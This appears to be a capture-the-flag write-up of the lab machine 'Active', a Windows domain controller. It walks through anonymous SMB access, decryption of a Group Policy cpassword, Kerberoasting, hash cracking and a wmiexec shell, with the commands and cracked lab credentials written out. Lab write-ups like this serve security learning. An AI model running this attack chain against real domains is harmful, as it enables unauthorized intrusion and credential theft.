# Box: Active

> Damiano gubiani | 10/12/2025

export box ip

```bash
export IP='10.129.10.8'
```

# Enumeration

running nmap for open ports

command:

```bash
sudo nmap -sS -sC -oN nmap/scan -vv -T4 $IP
```

output:

```
Nmap scan report for 10.129.10.8
Host is up, received echo-reply ttl 127 (0.092s latency).
Scanned at 2025-12-10 09:22:06 EST for 92s
Not shown: 983 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
49152/tcp open  unknown          syn-ack ttl 127
49153/tcp open  unknown          syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45208/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 18802/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 27187/udp): CLEAN (Timeout)
|   Check 4 (port 33488/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-12-10T14:22:11
|_  start_date: 2025-12-10T14:17:59

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 09:23
Completed NSE at 09:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 09:23
Completed NSE at 09:23, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 92.76 seconds
           Raw packets sent: 1205 (52.996KB) | Rcvd: 1108 (44.388KB)

```

seems we are working with a domain controller

ports:

- 88,389,636 -> kerberos and ldap
- 139 -> smb

i started enumerating the LDAP protocol but i wasnt succesful 

but when i enumerate the SMB share we have a read permission on the _Replication_ share

command used for SMB share listing

```bash
nxc smb $IP -u '' -p '' --shares
```

output

![](screen/Pasted%20image%2020251210153650.png)

i connected to the share with the _smbclient_ comand

```bash
smbclient -N \\\\$IP\\Replication
```

when i listed the share i found the _active.htb_ directory wich i assume is the domain name

so i add it to the _/etc/hosts_ files

command:

```bash
echo "10.129.10.8 active.htb" | sudo tee -a /etc/hosts 
```

after checking around i found a Group.xml file containing some encrypted passwords

> active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\

i passed it to sublime text to format it in a JSON format

![](screen/Pasted%20image%2020251210160648.png)

after searching online to understand what cpassword is , i found a PoC for decrypting this password on github.

> https://github.com/t0thkr1s/gpp-decrypt

after installing the software with python2 i run it and got a match

> svc_tgs : GPPstillStandingStrong2k18

using the new found user i run an _asrep_ and _kerberos_ roasting attack on the machine with nxc

i got a match n the kerberoasting attack

![](screen/Pasted%20image%2020251210161518.png)

we have the hash of the administrator account

i passed it throught hashcat to crack the hash

command

```bash
hashcat -m 13100 -a 0 admin_kerb /usr/share/wordlists/rockyou.txt --username
```

and we crack it with success

> administrator : Ticketmaster1968

to connect remotely to the machine and get both flags i used impacket wmiexec since SMB is enabled and i cannot connect with winrm

command

```bash
impacket-wmiexec 'active.htb/administrator:Ticketmaster1968'@$IP
```

